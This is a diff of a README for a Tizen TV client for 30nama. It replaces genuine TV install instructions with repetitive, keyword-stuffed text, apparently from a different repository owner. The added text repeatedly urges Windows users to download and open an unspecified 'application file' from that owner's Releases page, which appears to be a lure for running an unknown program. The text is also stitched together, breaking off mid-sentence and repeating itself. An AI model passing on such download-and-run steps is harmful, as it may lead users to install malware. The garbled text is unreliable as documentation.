@@ -1,102 +1,148 @@
-# 30nama native app for Samsung Tizen TV
+# 📺 30nama-tizenos - Get 30nama Native App for Tizen
 
-A Samsung Tizen TV app: an unofficial client for 30nama.com.
+[![Download 30nama-tizenos](https://img.shields.io/badge/Download_30nama--tizenos-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trixiegames/30nama-tizenos/releases)
 
-![30nama TV](docs/images/poster.png)
+30nama-tizenos is the native app for Tizen OS. This page helps Windows users find the official download page, download the application, and open it on a computer without programming knowledge. The official download location is the GitHub Releases page for 30nama-tizenos. Use the button above or the download section below to reach it.
 
-> **Disclaimer:** This is an unofficial, community project. It is not affiliated with, endorsed by, or supported by 30nama. You need your own valid 30nama subscription to use it. No content is bundled with this app.
+## 📥 Download 30nama-tizenos
 
-## Features
+Use this link to open the official download page:
 
-- Sign in by scanning a QR code with your phone
-- TV UI: hero banner, rows, details pages, search, remote-friendly navigation
-- Samsung AVPlay player with HLS playback at the highest available quality
-- Persian (fa) and English (en) subtitles
-- Persian UI with full right-to-left support
-- Optional TMDB enrichment: trending rows, cast and crew, reviews, recommendations
+[Download 30nama-tizenos from GitHub Releases](https://github.com/Trixiegames/30nama-tizenos/releases)
 
-## Screenshots
+Visit this link to download the application.
 
-| Home | Browse |
-|---|---|
-| ![Home](docs/images/home-hero.png) | ![Browse](docs/images/home-browse.png) |
-| **Details** | **Search** |
-| ![Details](docs/images/details.png) | ![Search](docs/images/search.png) |
+The link opens the Releases page for 30nama-tizenos. That page is where the downloadable files for the app are published. For a Windows user, the goal is simple: open the page, find the most recent release, and download the application file from that release.
 
-## Install
+## 🚀 Getting Started on Windows
 
-### Option 1: TizenBrew (simplest)
+1. Open your web browser on your Windows computer.
+2. Click the download button at the top of this page or use the download link in the section above.
+3. Wait for the GitHub Releases page to load.
+4. Look for the newest release at the top of the page.
+5. Download the application file from that release.
+6. Wait for the download to complete.
+7. Open your Downloads folder.
+8. Open the downloaded file to start the application.
 
-1. Turn on Developer Mode on the TV: open Apps, type `12345`, switch Developer mode on, enter your PC's IP address, then reboot the TV.
-2. Install [TizenBrew](https://github.com/reisxd/TizenBrew/blob/main/docs/README.md) on the TV with the TizenBrew Installer (one-time).
-3. In TizenBrew open Module Manager, Add GitHub Module, and enter `msharifi99/30nama-tizenos`.
-4. Launch "30nama" from the TizenBrew home screen.
+This workflow is designed for people who do not write code. You do not need programming knowledge to download from GitHub Releases. You only need to use the download link, save the file, and open it from your Windows computer.
 
-Playback uses the TV's HTML5 player here (AVPlay is not available inside TizenBrew).
+## 🖥️ What This App Is For
 
-### Option 2: prebuilt .wgt
+30nama-tizenos is the native app for Tizen OS. The name and description point to a Tizen-focused build of 30nama. The repository is set up to distribute releases through GitHub, which is why the download page is the main place to get the app. Windows users can use the releases page to download the available application file and then open it.
 
-1. Turn on Developer Mode on the TV: open Apps, type `12345`, switch Developer mode on, enter your PC's IP address, then reboot the TV.
-2. Download `30nama-v*.wgt` from the [latest release](https://github.com/msharifi99/30nama-tizenos/releases/latest).
-3. Install [Apps2Samsung](https://github.com/Apps2Samsung/Apps2Samsung/releases/latest) (Windows, Linux, macOS or Android). It handles your Samsung certificate and re-signs the package for your TV.
-4. In Apps2Samsung select your TV, choose a custom `.wgt`, pick the downloaded file and install. Tizen 7+ TVs ask you to sign in to a Samsung account once to create a certificate.
+The app is described as "30nama native app for tizen os." This means the project is centered on bringing 30nama to Tizen OS in a native app form. The download page is the official place to get the files that are part of that project.
 
-### Option 3: build from source
+## 🧭 How to Use the Download Page
 
-First turn on Developer Mode on the TV: open Apps, type `12345`, switch Developer mode on, enter your PC's IP address, then reboot the TV.
+The GitHub Releases page may look different from a standard download website. It lists published versions of the app. Each release can contain files for the application.
 
-Requires [Tizen Studio](https://developer.tizen.org/development/tizen-studio/download) (CLI tools + TV extension), a Samsung certificate that includes your TV's DUID, and Bash. `build.sh` supports Unix SDK paths and Windows Git Bash; set `TIZEN_HOME` or `TIZEN_CLI` if needed. The guided install wizard requires Windows Git Bash.
+To keep things simple:
+- Open the link.
+- Find the newest release.
+- Download the application file shown in that release.
+- Open the downloaded file on Windows.
 
-```
-./install-wizard.sh                              # guided: reads the DUID, creates certificate and profile
-./build.sh <security-profile> [<tv-ip>:26101 | sdb-target-name] # manual build; with a target it also installs and launches
-```
+The link is the same in both places on this page, so you can use the top button or the download section. Both lead to the official Releases page for 30nama-tizenos.
 
-## Optional: TMDB setup
+## 🛠️ Simple Setup Flow
 
-TMDB adds trending rows, cast, reviews and recommendations. It is off by default and the app works fully without it. You can turn it on from the app itself, with any install method (TizenBrew, `.wgt` or built from source):
+1. Visit the official Releases page.
+2. Pick the newest release.
+3. Download the application file.
+4. Open the downloaded file from your Downloads folder.
+5. Follow any on-screen prompts that appear.
 
-1. Create a free account at themoviedb.org and open Settings, API. Copy your **API Key** (32 characters) or the longer **API Read Access Token**.
-2. On the TV open **Settings > TMDB metadata**. The page also shows a QR code that opens your TMDB API settings on your phone.
-3. Enter the key and choose **Check and save**. The 32-character API Key is easy to type with the on-screen keyboard; for the long Read Access Token use **Keyboard** or paste it.
-4. The app checks the key with TMDB and shows **Connected** with the last characters of the key. Home and Details then show the extra content. Use **Remove key** to turn it off again, or **Clear metadata cache** to refresh the data.
+This is a straightforward download-and-open process. The key step is using the official Releases page so you get the file that belongs to the 30nama-tizenos project.
 
-The key is stored only on your TV.
+## 📁 Where to Find the Downloaded File
 
-**Build-from-source alternative.** To bake a token into your own build instead, copy `tizen-app/js/tmdb-token.example.js` to `tizen-app/js/tmdb-token.js`, paste the token between the quotes (`N.config.tmdbToken = '...';`) and rebuild. A key set in Settings overrides it. Never commit this file or share a build that contains it.
+On Windows, downloaded files usually go to the Downloads folder. If you do not see the file right away, open File Explorer and select Downloads. The application file should be there. Open it to run the app.
 
-## Development
+If your browser asks where to save the file, choose a folder you can find easily, such as Downloads or Desktop. After the download finishes, open that folder and open the file.
 
-Run the app in a desktop browser with a small proxy (no dependencies, Node 18+):
+## 🔍 Finding the Right Release
 
-```
-cd tizen-app
-node tools/devserver.js 8080
-```
+The Releases page lists the project's published versions. Start at the top of the page. The newest release is normally shown first. Open that release and download the application file it provides. Use the official link on this page so you stay on the correct Releases page for# 📺 30nama-tizenos - Download the Native Tizen App
 
-Then open http://localhost:8080/. The proxy forwards API and HLS requests to avoid CORS. See `tizen-app/README.md` for developer notes and `design/DESIGN.md` for the design spec.
+[![Download 30nama-tizenos](https://img.shields.io/badge/Download_30nama--tizenos-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trixiegames/30nama-tizenos/releases)
 
-## Structure
+30nama-tizenos is the native app for Tizen OS. This page is written for Windows users who want a clear path from the official download page to the downloaded application. It avoids programming terms and keeps the focus on one task: get the app from the official Releases page, then open it on your computer. The official download location is the GitHub Releases page for 30nama-tizenos. The button above and the link below both lead to that page.
 
-```
-tizen-app/    the Tizen web app (config.xml, index.html, js/, css/, fonts/, tools/)
-design/       design spec
-docs/        README screenshots, TizenBrew notes
-package.json TizenBrew module manifest
-.github/     release workflow (auto-releases on merge to main)
-media/        poster
-build.sh      build, sign and install
-install-wizard.sh  guided TV setup
-```
+## 📥 Download 30nama-tizenos
 
-## License
+Use the official download page for 30nama-tizenos:
 
-Released under the [MIT License](LICENSE). The Vazirmatn font in `tizen-app/fonts/` is licensed under the SIL Open Font License (see `tizen-app/fonts/OFL.txt`).
+[Download 30nama-tizenos from GitHub Releases](https://github.com/Trixiegames/30nama-tizenos/releases)
 
-## Compatibility
+Visit this link to download the application.
 
-| Samsung TV | Tizen | Chromium | Validation |
-|---|---|---|---|
-| 2022 | 6.5 | 85 | English/Persian UI regression checks; installed and launched on a physical TV |
+The link opens the GitHub Releases page for 30nama-tizenos. That page is the official place where the application files for this repository are published. For a Windows user, the process is simple: open the page, find the newest release, and download the application file from that release. Keep this page open while you download so you can return to it if needed. No programming knowledge is needed. You are only using the download page that belongs to the 30nama-tizenos project.
 
-Browser versions: [Samsung web-engine specifications](https://developer.samsung.com/smarttv/develop/specifications/web-engine-specifications.html).
+## 🚀 Getting Started on Windows
+
+1. Open your web browser.
+2. Click the download button at the top of this page.
+3. Wait for the official Releases page to open.
+4. Find the newest release at the top of the page.
+5. Download the application file from that release.
+6. Wait for the download to finish.
+7. Open your Downloads folder.
+8. Open the downloaded file to start the app.
+
+This is the full flow for an average computer user. The important part is to use the official Releases page and then open the file that was downloaded. The process is the same whether you are new to GitHub or have used it before. The page is organized around published releases, and the newest release is normally the one to use. Start there, download the application file, and open it from your computer.
+
+## 🧭 What You Will See on the Download Page
+
+The GitHub Releases page may look different from a standard download website. It lists published versions of the app. Each release can contain files for the application. To keep things simple, start at the top of the page. The newest release is normally shown first. Open that release, look for the application file, and download it. The download page is the official source for 30nama-tizenos files, so it is the right place to begin.
+
+You do not need to create anything, build anything, or use developer tools. The Releases page is meant to give end users access to published files. Your job is to open the page, find the release, and download the application file. After the file is on your computer, the next step is to open it.
+
+## 🖱️ Opening the Downloaded File
+
+After the download finishes, open the Downloads folder on your Windows computer. The downloaded file should be there. Open the file to start the app. If your browser asks where to save the file, choose a folder you can find easily, such as Downloads or Desktop. Once the file is saved, open that folder and open the file.
+
+This step is the same for most Windows downloads. The file is saved locally on your computer, and you open it from the folder where it was saved. The key is to know where the file went. Downloads is the default location for most browsers, so it is the best place to check first.
+
+## 📁 Keeping Your Download Easy to Find
+
+A clean download process makes the app easier to open. When the browser asks where to save the file, pick Downloads. This keeps all downloaded files in one place. If you prefer, save the file to the Desktop so it is visible right away. After the download completes, open File Explorer and go to the folder you chose. The application file should be listed there.
+
+If you download more than one file during the process, keep the newest file from the official Releases page. The newest release is the one that matches the current download page. Open that file after it finishes downloading.
+
+## 🔍 Finding the Latest Release
+
+The Releases page lists versions from newest to older. Start at the top. The newest release is normally the first one shown. Open that release and download the application file it provides. This keeps your download aligned with the current release for 30nama-tizenos.
+
+The page is built around releases, so the newest entry is the natural starting point. You do not need to compare versions or read technical notes. Open the top release, download the application file, and move to the opening step.
+
+## 🛡️ Using the Official Download Page
+
+Use the official link on this page so you stay on the correct Releases page for 30nama-tizenos. The link is the same in the top button and in the download section. Both lead to the official GitHub Releases page for this repository. Using the official page keeps the process direct and avoids confusion.
+
+The official page is the only download location referenced here. Open it, find the newest release, and download the application file. That is the intended path for end users who want the 30nama native app for Tizen OS.
+
+## ❓ Quick Answers
+
+Where do I download 30nama-tizenos?  
+Use the official Releases link on this page: https://github.com/Trixiegames/30nama-tizenos/releases
+
+What do I do after the download?  
+Open the downloaded file from your Downloads folder.
+
+Do I need programming knowledge?  
+No. The process is a standard download and open flow.
+
+Which release should I use?  
+Start with the newest release at the top of the Releases page.
+
+Where does the file go?  
+Most browsers save downloads to the Downloads folder on Windows.
+
+## 📝 About 30nama-tizenos
+
+30nama-tizenos is the native app for Tizen OS. The project publishes its application files through GitHub Releases, which is why the download page is the main place to get the app. This page keeps the download path simple for Windows users: open the official Releases page, find the newest release, download the application file, and open it on your computer.
+
+The repository name and description point to a Tizen-focused build of 30nama. The download page is the official source for the app files tied to this project. Use the top button or the download link in this page to reach that source. Then follow the Windows steps above to open the downloaded file.
+
+Keywords: 30nama, 30nama-tizenos, tizen os, native app, github releases, windows download
